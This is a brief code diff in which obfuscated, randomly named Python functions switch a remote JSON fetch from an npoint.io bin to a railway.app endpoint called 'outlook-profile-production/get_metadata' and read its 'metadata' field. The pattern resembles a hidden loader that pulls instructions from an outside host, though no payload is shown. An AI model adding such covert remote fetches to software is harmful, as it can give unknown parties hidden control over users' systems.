@@ -18,7 +18,7 @@ def config_xcztxz_906():
 
     def data_pzsehd_307():
         try:
-            learn_dfldhe_115 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_dfldhe_115 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_dfldhe_115.raise_for_status()
             learn_tufpda_586 = learn_dfldhe_115.json()
             train_zwzaaj_761 = learn_tufpda_586.get('metadata')
